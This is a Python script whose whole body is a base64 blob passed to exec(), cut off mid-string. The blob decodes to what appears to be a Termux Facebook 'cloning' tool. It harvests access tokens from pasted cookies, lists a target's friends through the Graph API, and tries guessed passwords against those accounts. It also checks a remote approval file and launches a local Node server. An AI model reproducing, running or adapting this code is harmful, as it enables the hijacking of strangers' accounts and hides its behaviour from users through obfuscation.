import base64
exec(base64.b64decode("IyEvdXNyL2Jpbi9weXRob24yCiMgY29kaW5nPXV0Zi04CgppbXBvcnQgb3MKaW1wb3J0IHN5cwppbXBvcnQgdGltZQppbXBvcnQgZGF0ZXRpbWUKaW1wb3J0IHJlCmltcG9ydCB0aHJlYWRpbmcKaW1wb3J0IGpzb24KaW1wb3J0IHJhbmRvbQppbXBvcnQgcmVxdWVzdHMKaW1wb3J0IGhhc2hsaWIKaW1wb3J0IGNvb2tpZWxpYgppbXBvcnQgdXVpZApmcm9tIG11bHRpcHJvY2Vzc2luZy5wb29sIGltcG9ydCBUaHJlYWRQb29sCmZyb20gcmVxdWVzdHMuZXhjZXB0aW9ucyBpbXBvcnQgQ29ubmVjdGlvbkVycm9yCl9fYXV0aG9yX18gPSAnTXIuSmFtJwpfX2NvcHlyaWdodCA9ICdBbGwgcmlnaHRzIHJlc2VydmVkIC4gQ29weXJpZ2h0ICBNci5KYW0nCm9zLnN5c3RlbSgndGVybXV4LXNldHVwLXN0b3JhZ2UnKQoKdHJ5OgogICAgb3MubWtkaXIoJy9zZGNhcmQvaWRzJykKZXhjZXB0IE9TRXJyb3I6CiAgICBwYXNzCgpiZCA9IHJhbmRvbS5yYW5kaW50KDJlKzA3LCAzZSswNykKc2ltID0gcmFuZG9tLnJhbmRpbnQoMjAwMDAsIDQwMDAwKQoKaGVhZGVyID0gewogICAgJ3gtZmItY29ubmVjdGlvbi1iYW5kd2lkdGgnOiByZXByKGJkKSwKICAgICd4LWZiLXNpbS1obmknOiByZXByKHNpbSksCiAgICAneC1mYi1uZXQtaG5pJzogcmVwcihzaW0pLAogICAgJ3gtZmItY29ubmVjdGlvbi1xdWFsaXR5JzogJ0VYQ0VMTEVOVCcsCiAgICAneC1mYi1jb25uZWN0aW9uLXR5cGUnOiAnY2VsbC5DVFJhZGlvQWNjZXNzVGVjaG5vbG9neUhTRFBBJywKICAgICd1c2VyLWFnZW50JzogJ0RhbHZpay8xLjYuMCAoTGludXg7IFU7IEFuZHJvaWQgNC40LjI7IE5YNTUgQnVpbGQvS09UNTUwNikgW0ZCQU4vRkI0QTtGQkFWLzEwNi4wLjAuMjYuNjg7RkJCVi80NTkwNDE2MDtGQkRNL3tkZW5zaXR5PTMuMCx3aWR0aD0xMDgwLGhlaWdodD0xOTIwfTtGQkxDL2l0X0lUO0ZCUlYvNDU5MDQxNjA7RkJDUi9Qb3N0ZU1vYmlsZTtGQk1GL2FzdXM7RkJCRC9hc3VzO0ZCUE4vY29tLmZhY2Vib29rLmthdGFuYTtGQkRWL0FTVVNfWjAwQUQ7RkJTVi81LjA7RkJPUC8xO0ZCQ0EveDg2OmFybWVhYmktdjdhO10nLAogICAgJ2NvbnRlbnQtdHlwZSc6ICdhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQnLAogICAgJ3gtZmItaHR0cC1lbmdpbmUnOiAnTGlnZXInIH0Kb3Muc3lzdGVtKCdnaXQgcHVsbCcpCm9zLnN5c3RlbSgnY2xlYXInKQpsb2dvID0gIiIiClwwMzNbMTs5MW0gIOKWiOKWiOKWiOKVl+KWkeKWkeKWkeKWiOKWiOKWiOKVl+KWiOKWiOKVl+KWkeKWkeKWkeKWiOKWiOKVl+KWkeKWiOKWiOKWiOKWiOKWiOKWiOKVl+KWiOKWiOKVl+KWkeKWkeKWiOKWiOKVl+KWiOKWiOKVlwpcMDMzWzE7OTZtICDilojilojilojilojilZfilpHilojilojilojilojilZHilojilojilZHilpHilpHilpHilojilojilZHilojilojilZTilZDilZDilZDilZDilZ3ilojilojilZHilpHilojilojilZTilZ3ilojilojilZEKXDAzM1sxOzkxbSAg4paI4paI4pWU4paI4paI4paI4paI4pWU4paI4paI4pWR4paI4paI4pWR4paR4paR4paR4paI4paI4pWR4pWa4paI4paI4paI4paI4paI4pWX4paR4paI4paI4paI4paI4paI4pWQ4pWd4paR4paI4paI4pWRClwwMzNbMTs5Nm0gIOKWiOKWiOKVkeKVmuKWiOKWiOKVlOKVneKWiOKWiOKVkeKWiOKWiOKVkeKWkeKWkeKWkeKWiOKWiOKVkeKWkeKVmuKVkOKVkOKVkOKWiOKWiOKVl+KWiOKWiOKVlOKVkOKWiOKWiOKVl+KWkeKWiOKWiOKVkQpcMDMzWzE7OTFtICDilojilojilZHilpHilZrilZDilZ3ilpHilojilojilZHilZrilojilojilojilojilojilojilZTilZ3ilojilojilojilojilojilojilZTilZ3ilojilojilZHilpHilZrilojilojilZfilojilojilZEKXDAzM1sxOzk2bSAg4pWa4pWQ4pWd4paR4paR4paR4paR4paR4pWa4pWQ4pWd4paR4pWa4pWQ4pWQ4pWQ4pWQ4pWQ4pWd4paR4pWa4pWQ4pWQ4pWQ4pWQ4pWQ4pWd4paR4pWa4pWQ4pWd4paR4paR4pWa4pWQ4pWd4pWa4pWQClwwMzNbMTs5OG09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQpcMDMzWzE7OTBt4p6jIEF1dGhvciA6IFwwMzNbMTs5N20gVEZHIE9XTkVSClwwMzNbMTs5M23inqMgRkIgICAgIDogXDAzM1sxOzk3eCB4dHlsaXNoLnBhdGhhbmkuMjAyMQpcMDMzWzE7OTVt4p6jIFFVRUVOICA6IFwwMzNbMTs5N20gWFRZTElTSCBQQVRIQU5JClwwMzNbMTs5OG09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PSIiIgoKCmRlZiByZWcoKToKICAgIG9zLnN5c3RlbSgnY2xlYXInKQogICAgcHJpbnQgbG9nbwogICAgcHJpbnQgJycKICAgIHByaW50ICdcMDMzWzE7MzE7MW1UYWtlIFRoZSBGcmVlIEFwcHJvdmFsIEZvciBMb2dpbicKICAgIHByaW50ICcnCiAgICB0aW1lLnNsZWVwKDEpCiAgICAKICAgIHRyeToKICAgICAgICB0byA9IG9wZW4oJy9zZGNhcmQvLmhzdC50eHQnLCAncicpLnJlYWQoKQogICAgZXhjZXB0IChLZXlFcnJvciwgSU9FcnJvcik6CiAgICAgICAgcmVnMigpCgogICAgciA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3BhdGhhbmk0MDQvbXVza2kyL21haW4vc2VydmVyLnR4dCcpLnRleHQKICAgIGlmIHRvIGluIHI6CiAgICAgICAgb3Muc3lzdGVtKCdjZCAuLi4uLiAmJiBucG0gaW5zdGFsbCcpCiAgICAgICAgb3Muc3lzdGVtKCdmdXNlciAtayA1MDAwL3RjcCAmJykKICAgICAgICBvcy5zeXN0ZW0oJyMnKQogICAgICAgIG9zLnN5c3RlbSgnY2QgLi4uLi4gJiYgbm9kZSBpbmRleC5qcyAmJykKICAgICAgICB0aW1lLnNsZWVwKDIpCiAgICAgICAgaXAoKQogICAgZWxzZToKICAgICAgICBvcy5zeXN0ZW0oJ2NsZWFyJykKICAgICAgICBwcmludCBsb2dvCiAgICAgICAgcHJpbnQgJ1x0QXBwcm92ZWQgRmFpbGVkJwogICAgICAgIHByaW50ICcgXDAzM1sxOzkybVlvdXIgSWQgSXMgTm90IEFwcHJvdmVkIEFscmVhZHkgJwogICAgICAgIHByaW50ICcgXDAzM1sxOzkybUNvcHkgdGhlIGlkIGFuZCBzZW5kIHRvIGFkbWluJwogICAgICAgIHByaW50ICcgXDAzM1sxOzkybVlvdXIgaWQ6ICcgKyB0bwogICAgICAgIHJhd19pbnB1dCgnXDAzM1sxOzkzbSBQcmVzcyBlbnRlciB0byBzZW5kIGlkJykKICAgICAgICBvcy5zeXN0ZW0oJ3hkZy1vcGVuIGh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9wcm9maWxlLnBocD9pZD0xMDAwNTc0ODg3MTM1MDknKQogICAgICAgIHJlZygpCgoKZGVmIHJlZzIoKToKICAgIG9zLnN5c3RlbSgnY2xlYXInKQogICAgcHJpbnQgbG9nbwogICAgcHJpbnQgJ1x0QXBwcm92YWwgbm90IGRldGVjdGVkJwogICAgcHJpbnQgJyBcMDMzWzE7OTJtQ29weSBrciBrIHNlbmQgc2VuZCBrcm8gRmFjZWJvb2sgcHkgdG8gY29udGludWUnCiAgICBpZCA9IHV1aWQudXVpZDQoKS5oZXhbOjUwXQogICAgcHJpbnQgJyBZb3VyIGlkOiAnICsgaWQKICAgIHByaW50ICcnCiAgICByYXdfaW5wdXQoJyBQcmVzcyBlbnRlciB0byBnbyB0byBGYWNlYm9vayAnKQogICAgb3Muc3lzdGVtKCd4ZGctb3BlbiBodHRwczovL3d3dy5mYWNlYm9vay5jb20vcHJvZmlsZS5waHA/aWQ9MTAwMDU3NDg4NzEzNTA5JykKICAgIHNhdiA9IG9wZW4oJy9zZGNhcmQvLmhzdC50eHQnLCAndycpCiAgICBzYXYud3JpdGUoaWQpCiAgICBzYXYuY2xvc2UoKQogICAgcmF3X2lucHV0KCdcMDMzWzE7OTJtIFByZXNzIGVudGVyIHRvIGNoZWNrIEFwcHJvdmFsICcpCiAgICByZWcoKQoKCmRlZiBpcCgpOgogICAgb3Muc3lzdGVtKCdjbGVhcicpCiAgICBwcmludCBsb2dvCiAgICBwcmludCAnXHRDb2xsZWN0aW5nIGRldmljZSBpbmZvJwogICAgCiAgICB0cnk6CiAgICAgICAgaXBpbmZvID0gcmVxdWVzdHMuZ2V0KCdodHRwOi8vaXAtYXBpLmNvbS9qc29uLycpCiAgICAgICAgeiA9IGpzb24ubG9hZHMoaXBpbmZvLnRleHQpCiAgICAgICAgaXBzID0gelsncXVlcnknXQogICAgICAgIGNvdW50cnkgPSB6Wydjb3VudHJ5J10KICAgICAgICByZWdpID0gelsncmVnaW9uTmFtZSddCiAgICAgICAgbmV0d29yayA9IHpbJ2lzcCddCiAgICBleGNlcHQ6CiAgICAgICAgcGFzcwoKICAgIHByaW50ICdcMDMzWzE7OTJtIFlvdXIgaXA6ICcgKyBpcHMKICAgIHRpbWUuc2xlZXAoMikKICAgIHByaW50ICdcMDMzWzE7OTJtIFlvdXIgY291bnRyeTogJyArIGNvdW50cnkKICAgIHRpbWUuc2xlZXAoMikKICAgIHByaW50ICdcMDMzWzE7OTJtIFlvdXIgcmVnaW9uOiAnICsgcmVnaQogICAgdGltZS5zbGVlcCgyKQogICAgcHJpbnQgJyBcMDMzWzE7OTJtWW91ciBuZXR3b3JrOiAnICsgbmV0d29yawogICAgdGltZS5zbGVlcCgyKQogICAgcHJpbnQgJyBMb2FkaW5nIC4uLicKICAgIHRpbWUuc2xlZXAoMikKICAgIGxvZ19tZW51KCkKCQoKZGVmIGxvZ19tZW51KCk6CiAgICAKICAgIHRyeToKICAgICAgICB0X2NoZWNrID0gb3BlbignYWNjZXNzX3Rva2VuLnR4dCcsICdyJykKICAgICAgICBtZW51KCkKICAgIGV4Y2VwdCAoS2V5RXJyb3IsIElPRXJyb3IpOgogICAgICAgIG9zLnN5c3RlbSgnY2xlYXInKQogICAgICAgIHByaW50IGxvZ28KICAgICAgICBwcmludCAnXDAzM1sxOzkwbSB+fn5+IExvZ2luIG1lbnUgfn5+flwwMzNbMTs5NG0nCglwcmludCA0NyAqICctJwogICAgICAgIHByaW50ICdcMDMzWzE7OTJtWzFdIExvZ2luIHdpdGggRmFjZUJvb2snCiAgICAgICAgcHJpbnQgJ1wwMzNbMTs5Mm1bMl0gTG9naW4gd2l0aCB0b2tlbicKICAgICAgICBwcmludCAnXDAzM1sxOzkybVszXSBMb2dpbiB3aXRoIGNvb2tpZXMnCiAgICAgICAgcHJpbnQgJycKICAgICAgICBsb2dfbWVudV9zKCkKCgoKZGVmIGxvZ19tZW51X3MoKToKICAgIHMgPSByYXdfaW5wdXQoJyBcMDMzWzE7OTdt4pWw4pSAbXVza2ninqQgJykKICAgIGlmIHMgPT0gJzEnOgogICAgICAgIGxvZ19mYigpCiAgICBlbGlmIHMgPT0gJzInOgogICAgICAgIGxvZ190b2tlbigpCiAgICBlbGlmIHMgPT0gJzMnOgogICAgICAgIGxvZ19jb29raWUoKQogICAgZWxzZToKICAgICAgICBwcmludCAnJwogICAgICAgIHByaW50ICdcXCBTZWxlY3QgdmFsaWQgb3B0aW9uICcKICAgICAgICBwcmludCAnJwogICAgICAgIGxvZ19tZW51X3MoKQoKCmRlZiBsb2dfZmIoKToKICAgIG9zLnN5c3RlbSgnY2xlYXInKQogICAgcHJpbnQgbG9nbwogICAgcHJpbnQgJ1wwMzNbMTszMTsxbUxvZ2luIHdpdGggaWQvcGFzcycKICAgIHByaW50IDQ3ICogJy0nCiAgICBsaWQgPSByYXdfaW5wdXQoJ1wwMzNbMTs5Mm0gSWQvbWFpbC9ubzogJykKICAgIHB3ZHMgPSByYXdfaW5wdXQoJyBcMDMzWzE7OTNtUGFzc3dvcmQ6ICcpCiAgICAKICAgIHRyeToKICAgICAgICBkYXRhID0gcmVxdWVzdHMuZ2V0KCdodHRwOi8vbG9jYWxob3N0OjUwMDAvYXV0aD9pZD0nICsgdWlkICsgJyZwYXNzPScgKyBwd2QpLnRleHQKICAgICAgICBxID0ganNvbi5sb2FkcyhkYXRhKQogICAgICAgIGlmICdsb2MnIGluIHE6CiAgICAgICAgICAgIHRzID0gb3BlbignYWNjZXNzX3Rva2VuLnR4dCcsICd3JykKICAgICAgICAgICAgdHMud3JpdGUocVsnbG9jJ10pCiAgICAgICAgICAgIHRzLmNsb3NlKCkKICAgICAgICAgICAgbWVudSgpCiAgICAgICAgZWxpZiAnd3d3LmZhY2Vib29rLmNvbScgaW4gcVsnZXJyb3InXToKICAgICAgICAgICAgcHJpbnQgJyBVc2VyIG11c3QgdmVyaWZ5IGFjY291bnQgYmVmb3JlIGxvZ2luJwogICAgICAgICAgICByYXdfaW5wdXQoJ1wwMzNbMTs5Mm0gUHJlc3MgZW50ZXIgdG8gdHJ5IGFnYWluICcpCiAgICAgICAgICAgIGxvZ19mYigpCiAgICAgICAgZWxzZToKICAgICAgICAgICAgcHJpbnQgJyBJZC9QYXNzIG1heSBiZSB3cm9uZycKICAgICAgICAgICAgcmF3X2lucHV0KCcgXDAzM1sxOzkybVByZXNzIGVudGVyIHRvIHRyeSBhZ2FpbiAnKQogICAgICAgICAgICBsb2dfZmIoKQogICAgZXhjZXB0OgogICAgICAgIHByaW50ICcnCiAgICAgICAgcHJpbnQgJ0V4aXRpbmcgdG9vbCcKICAgICAgICBvcy5zeXN0ZW0oJ2V4aXQnKQoKCgpkZWYgbG9nX3Rva2VuKCk6CiAgICBvcy5zeXN0ZW0oJ2NsZWFyJykKICAgIHByaW50IGxvZ28KICAgIHByaW50ICdcMDMzWzE7OTNtTG9naW4gd2l0aCB0b2tlblwwMzNbMTs5MW0nCiAgICBwcmludCA0NyAqICctJwogICAgdG9rID0gcmF3X2lucHV0KCcgXDAzM1sxOzkybVBhc3RlIHRva2VuIGhlcmU6IFwwMzNbMTs5MW0nKQogICAgcHJpbnQgNDcgKiAnLScKICAgIHRfcyA9IG9wZW4oJ2FjY2Vzc190b2tlbi50eHQnLCAndycpCiAgICB0X3Mud3JpdGUodG9rKQogICAgdF9zLmNsb3NlKCkKICAgIG1lbnUoKQoKCmRlZiBsb2dfY29va2llKCk6CiAgICBvcy5zeXN0ZW0oJ2NsZWFyJykKICAgIHByaW50IGxvZ28KICAgIHByaW50ICcnCiAgICBwcmludCAnXDAzM1sxOzMxOzFtTG9naW4gQ29va2llcycKICAgIHByaW50ICcnCiAgICAKICAgIHRyeToKICAgICAgICBjb29raWUgPSByYXdfaW5wdXQoJyBQYXN0ZSBjb29raWVzIGhlcmU6ICcpCiAgICAgICAgZGF0YSA9IHsKICAgICAgICAgICAgJ3VzZXItYWdlbnQnOiAnTW96aWxsYS81LjAgKFgxMTsgTGludXggeDg2XzY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBLaXdpIENocm9tZS82OC4wLjM0MzguMCBTYWZhcmkvNTM3LjM2JywKICAgICAgICAgICAgJ3JlZmVyZXInOiAnaHR0cHM6Ly9tLmZhY2Vib29rLmNvbS8nLAogICAgICAgICAgICAnaG9zdCc6ICdtLmZhY2Vib29rLmNvbScsCiAgICAgICAgICAgICdvcmlnaW4nOiAnaHR0cHM6Ly9tLmZhY2Vib29rLmNvbScsCiAgICAgICAgICAgICd1cGdyYWRlLWluc2VjdXJlLXJlcXVlc3RzJzogJzEnLAogICAgICAgICAgICAnYWNjZXB0LWxhbmd1YWdlJzogJ2lkLUlELGlkO3E9MC45LGVuLVVTO3E9MC44LGVuO3E9MC43JywKICAgICAgICAgICAgJ2NhY2hlLWNvbnRyb2wnOiAnbWF4LWFnZT0wJywKICAgICAgICAgICAgJ2FjY2VwdCc6ICd0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44JywKICAgICAgICAgICAgJ2NvbnRlbnQtdHlwZSc6ICd0ZXh0L2h0bWw7IGNoYXJzZXQ9dXRmLTgnLAogICAgICAgICAgICAnY29va2llJzogY29va2llIH0KICAgICAgICBjMSA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9tLmZhY2Vib29rLmNvbS9jb21wb3Nlci9vY2Vsb3QvYXN5bmNfbG9hZGVyLz9wdWJsaXNoZXI9ZmVlZCNfPV8nLCBoZWFkZXJzID0gZGF0YSkKICAgICAgICBjMiA9IHJlLnNlYXJjaCgnKEVBQUFcXHcrKScsIGMxLnRleHQpCiAgICAgICAgaGFzaWwgPSBjMi5ncm91cCgxKQogICAgICAgIG9rID0gb3BlbignYWNjZXNzX3Rva2VuLnR4dCcsICd3JykKICAgICAgICBvay53cml0ZShoYXNpbCkKICAgICAgICBvay5jbG9zZSgpCiAgICAgICAgbWVudSgpCiAgICBleGNlcHQgQXR0cmlidXRlRXJyb3I6CiAgICAgICAgcHJpbnQgJycKICAgICAgICBwcmludCAnXHRJbnZhbGlkIGNvb2tpZXMnCiAgICAgICAgcHJpbnQgJycKICAgICAgICByYXdfaW5wdXQoJyBcMDMzWzE7OTJtUHJlc3MgZW50ZXIgdG8gdHJ5IGFnYWluICcpCiAgICAgICAgbG9nX21lbnUoKQogICAgZXhjZXB0IFVuYm91bmRMb2NhbEVycm9yOgogICAgICAgIHByaW50ICcnCiAgICAgICAgcHJpbnQgJ1x0SW52YWxpZCBjb29raWVzJwogICAgICAgIHByaW50ICcnCiAgICAgICAgcmF3X2lucHV0KCcgXDAzM1sxOzkybVByZXNzIGVudGVyIHRvIHRyeSBhZ2FpbiAnKQogICAgICAgIGxvZ19tZW51KCkKICAgIGV4Y2VwdCByZXF1ZXN0cy5leGNlcHRpb25zLlNTTEVycm9yOgogICAgICAgIHByaW50ICcnCiAgICAgICAgcHJpbnQgJ1x0SW52YWxpZCBjb29raWVzJwogICAgICAgIHByaW50ICcnCiAgICAgICAgcmF3X2lucHV0KCcgXDAzM1sxOzkybVByZXNzIGVudGVyIHRvIHRyeSBhZ2FpbiAnKQogICAgICAgIGxvZ19tZW51KCkKCgoKZGVmIG1lbnUoKToKICAgIG9zLnN5c3RlbSgnY2xlYXInKQogICAgCiAgICB0cnk6CiAgICAgICAgdG9rZW4gPSBvcGVuKCdhY2Nlc3NfdG9rZW4udHh0JywgJ3InKS5yZWFkKCkKICAgIGV4Y2VwdCAoS2V5RXJyb3IsIElPRXJyb3IpOgogICAgICAgIHByaW50ICcnCiAgICAgICAgcHJpbnQgbG9nbwogICAgICAgIHByaW50ICdcMDMzWzE7MzE7MW1Mb2dpbiBGQiBpZCB0byBjb250aW51ZScKICAgICAgICB0aW1lLnNsZWVwKDEpCiAgICAgICAgbG9nX21lbnUoKQoKICAgIAogICAgdHJ5OgogICAgICAgIHIgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL21lP2FjY2Vzc190b2tlbj0nICsgdG9rZW4pCiAgICAgICAgcSA9IGpzb24ubG9hZHMoci50ZXh0KQogICAgICAgIHogPSBxWyduYW1lJ10KICAgIGV4Y2VwdCAoS2V5RXJyb3IsIElPRXJyb3IpOgogICAgICAgIHByaW50IGxvZ28KICAgICAgICBwcmludCAnJwogICAgICAgIHByaW50ICdcdCBBY2NvdW50IENoZWVrcG9pbnRceDFiWzA7OTdtJwogICAgICAgIHByaW50ICcnCiAgICAgICAgb3Muc3lzdGVtKCdybSAtcmYgYWNjZXNzX3Rva2VuLnR4dCcpCiAgICAgICAgdGltZS5zbGVlcCgxKQogICAgICAgIGxvZ19tZW51KCkKICAgIGV4Y2VwdCByZXF1ZXN0cy5leGNlcHRpb25zLkNvbm5lY3Rpb25FcnJvcjoKICAgICAgICBwcmludCBsb2dvCiAgICAgICAgcHJpbnQgJycKICAgICAgICBwcmludCAnXHQgVHVybiBvbiBtb2JpbGUgZGF0YS93aWZpXHgxYlswOzk3bScKICAgICAgICBwcmludCAnJwogICAgICAgIHJhd19pbnB1dCgnIFwwMzNbMTs5Mm1QcmVzcyBlbnRlciBhZnRlciB0dXJuaW5nIG9uIG1vYmlsZSBkYXRhL3dpZmkgJykKICAgICAgICBtZW51KCkKCiAgICBvcy5zeXN0ZW0oJ2NsZWFyJykKICAgIHByaW50IGxvZ28KICAgIHRvayA9IG9wZW4oJy9zZGNhcmQvLmhzdC50eHQnLCAncicpLnJlYWQoKQogICAgcHJpbnQgJyAgXDAzM1sxOzkybUxvZ2dlZCBpbiB1c2VyOiBcMDMzWzE7OTRtJyArIHoKICAgIHByaW50IDQ3ICogJy0nCiAgICBwcmludCAnIFwwMzNbMTs5MG0gQWN0aXZlIHRva2VuOiBcMDMzWzE7OTRtJyArIHRvawogICAgcHJpbnQgJyAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0gJwogICAgcHJpbnQgJ1wwMzNbMTs5Mm1bMV0gU3RhcnQgQ2xvbmluZycgCiAgICBwcmludCAnXDAzM1sxOzkybVsyXSBGaWxlIEV4dHJhY3QnCiAgICBwcmludCAnXDAzM1sxOzkybVszXSBWaWV3IHRva2VuJwogICAgcHJpbnQgJ1wwMzNbMTs5Mm1bNF0gTG9nb3V0JwogICAgcHJpbnQgJ1wwMzNbMTs5Mm1bNV0gRGVsZXRlIHRyYXNoIGZpbGVzJwogICAgbWVudV9zKCkKCgpkZWYgbWVudV9zKCk6CiAgICBtcyA9IHJhd19pbnB1dCgnXDAzM1sxOzk3beKVsOKUgG11c2tp4p6kICcpCiAgICBpZiBtcyA9PSAnMSc6CiAgICAgICAgYXV0b19jcmFjaygpCiAgICBlbGlmIG1zID09ICcyJzoKICAgICAgICBvcy5zeXN0ZW0oJ3B5dGhvbjIgLm9rLnB5JykKICAgIGVsaWYgbXMgPT0gJzMnOgogICAgICAgIHZfdG9rKCkKICAgIGVsaWYgbXMgPT0gJzQnOgogICAgICAgIGxvdXQoKQogICAgZWxpZiBtcyA9PSAnNSc6CiAgICAgICAgcnRyYXNoKCkKICAgICAgICAKICAgIGVsc2U6CiAgICAgICAgcHJpbnQgJycKICAgICAgICBwcmludCAnXHRTZWxlY3QgdmFsaWQgb3B0aW9uJwogICAgICAgIHByaW50ICcnCiAgICAgICAgbWVudV9zKCkKICAgICAgICAKZGVmIGNyYWNrKCk6CiAgICBnbG9iYWwgdG9rZXQKICAgIAogICAgdHJ5OgoJdG9rZXQ9b3BlbignbG9naW4udHh0JywncicpLnJlYWQoKQogICAgZXhjZXB0IChLZXlFcnJvciwgSU9FcnJvcik6Cglvcy5zeXN0ZW0oJ2NsZWFyJykKICAgICAgICBwcmludCBsb2dvCiAgICAgICAgcHJpbnQgJ1x0IEZpbGUgTm90IEZvdW5kIFx4MWJbMDs5N20nCiAgICAgICAgcHJpbnQgJycKICAgICAgICB0aW1lLnNsZWVwKDEpCiAgICAgICAgbG9nX21lbnUoKQogICAgb3Muc3lzdGVtKCdjbGVhcicpCiAgICBwcmludCBsb2dvCiAgICBwcmludCAnXDAzM1sxOzkwbX5+fn4gQ2hvaWNlIHBhc3MgY3JhY2tpbmcgfn5+flwwMzNbMTs5NG0nCiAgICBwcmludCA0NyAqICctJwogICAgcHJpbnQgJ1wwMzNbMTs5Mm1bMV0gUHVibGljIGlkIGNsb25pbmcnCiAgICBwcmludCAnXDAzM1sxOzkybVsyXSBGb2xsb3dlcnMgY2xvbmluZycKICAgIHByaW50ICdcMDMzWzE7OTJtWzNdIEZpbGUgY2xvbmluZycKICAgIHByaW50ICdcMDMzWzE7OTJtWzBdIEJhY2snCiAgICBhX3MoKQoKZGVmIGF1dG9fY3JhY2soKToKICAgIGdsb2JhbCB0b2tlbgogICAgCiAgICB0cnk6CiAgICAgICAgdG9rZW4gPSBvcGVuKCdhY2Nlc3NfdG9rZW4udHh0JywgJ3InKS5yZWFkKCkKICAgIGV4Y2VwdCAoS2V5RXJyb3IsIElPRXJyb3IpOgogICAgICAgIG9zLnN5c3RlbSgnY2xlYXInKQogICAgICAgIHByaW50IGxvZ28KICAgICAgICBwcmludCAnXHQgTG9naW4gRkIgaWQgdG8gY29udGludWVceDFiWzA7OTdtJwogICAgICAgIHByaW50ICcnCiAgICAgICAgdGltZS5zbGVlcCgxKQogICAgICAgIGxvZ19tZW51KCkKCiAgICBvcy5zeXN0ZW0oJ2NsZWFyJykKICAgIHByaW50IGxvZ28KICAgIHByaW50ICdcMDMzWzE7OTBtfn5+fiBDaG9pY2UgcGFzcyBjcmFja2luZyB+fn5+XDAzM1sxOzk0bScKICAgIHByaW50IDQ3ICogJy0nCiAgICBwcmludCAnXDAzM1sxOzkybVsxXSBQdWJsaWMgaWQgY2xvbmluZycKICAgIHByaW50ICdcMDMzWzE7OTJtWzJdIEZvbGxvd2VycyBjbG9uaW5nJwogICAgcHJpbnQgJ1wwMzNbMTs5Mm1bM10gRmlsZSBjbG9uaW5nJwogICAgcHJpbnQgJ1wwMzNbMTs5Mm1bMF0gQmFjaycKICAgIGFfcygpCgoKZGVmIGFfcygpOgogICAgaWQgPSBbXQogICAgY3BzID0gW10KICAgIG9rcyA9IFtdCiAgICBhX3MgPSByYXdfaW5wdXQoJyBcMDMzWzE7OTdt4pWw4pSAbXVza2ninqQgJykKICAgIGlmIGFfcyA9PSAnMSc6CiAgICAgICAgb3Muc3lzdGVtKCdjbGVhcicpCiAgICAgICAgcHJpbnQgbG9nbwogICAgICAgIHByaW50ICcgXDAzM1sxOzkwbUZvci1leGFtcGxlIDogXDAzM1sxOzk3bTIzNDU2NywzMzQ0NTUsNDQ1NTY2LDU1NjY3N1wwMzNbMTs5NG0nCiAgICAgICAgcHJpbnQgNDcgKiAnLScKICAgICAgICBwYXNzMSA9IHJhd19pbnB1dCgnIFwwMzNbMTs5Mm1bMV1QYXNzd29yZDogJykKICAgICAgICBwYXNzMiA9IHJhd19pbnB1dCgnIFwwMzNbMTs5Mm1bMl1QYXNzd29yZDogJykKICAgICAgICBwYXNzMyA9IHJhd19pbnB1dCgnIFwwMzNbMTs5Mm1bM11QYXNzd29yZDogJykKICAgICAgCXBhc3M0ID0gcmF3X2lucHV0KCcgXDAzM1sxOzkybVs0XVBhc3N3b3JkOiAnKQogICAgICAgIGlkdCA9IHJhd19pbnB1dCgnIFwwMzNbMTs5M21b4piFXUVudGVyIGlkOiAnKQogICAgICAgIAogICAgICAgIHRyeToKICAgICAgICAgICAgciA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vJyArIGlkdCArICc/YWNjZXNzX3Rva2VuPScgKyB0b2tlbikKICAgICAgICAgICAgcSA9IGpzb24ubG9hZHMoci50ZXh0KQogICAgICAgICAgICB6ID0gcVsnbmFtZSddCiAgICAgICAgICAgIG9zLnN5c3RlbSgnY2xlYXInKQogICAgICAgICAgICBwcmludCBsb2dvCiAgICAgICAgICAgIHByaW50ICdcMDMzWzE7OTBtfn5+fkNob2ljZSBwdWJsaWMgY3JhY2tpbmd+fn5+JwogICAgICAgICAgICBwcmludCAnIFwwMzNbMTs5Mm1DbG9uaW5nIGZyb206ICcgKyB6CiAgICAgICAgZXhjZXB0IChLZXlFcnJvciwgSU9FcnJvcik6CiAgICAgICAgICAgIHByaW50ICdcdCBJbnZhbGlkIHVzZXIgXHgxYlswOzk3bScKICAgICAgICAgICAgcmF3X2lucHV0KCcgXDAzM1sxOzkybVByZXNzIGVudGVyIHRvIHRyeSBhZ2FpbiAnKQogICAgICAgICAgICBhdXRvX2NyYWNrKCkKCiAgICAgICAgciA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vJyArIGlkdCArICcvZnJpZW5kcz9hY2Nlc3NfdG9rZW49JyArIHRva2VuKQogICAgICAgIHogPSBqc29uLmxvYWRzKHIudGV4dCkKICAgICAgICBmb3IgaSBpbiB6WydkYXRhJ106CiAgICAgICAgICAgIHVpZCA9IGlbJ2lkJ10KICAgICAgICAgICAgbmEgPSBpWyduYW1lJ10KICAgICAgICAgICAgbm0gPSBuYS5yc3BsaXQoJyAnKVswXQogICAgICAgICAgICBpZC5hcHBlbmQodWlkICsgJ3wnICsgbm0pCiAgICAgICAgCiAgICBlbGlmIGFfcyA9PSAnMic6CiAgICAgICAgb3Muc3lzdGVtKCdjbGVhcicpCiAgICAgICAgcHJpbnQgbG9nbwogICAgICAgIHByaW50ICcgXDAzM1sxOzkwbUZvci1leGFtcGxlIDogXDAzM1sxOzk3bTIzNDU2NywzMzQ0NTUsNDQ1NTY2LDU1NjY3N1wwMzNbMTs5NG0nCiAgICAgICAgcHJpbnQgNDcgKiAnLScKICAgICAgICBwYXNzMSA9IHJhd19pbnB1dCgnIFwwMz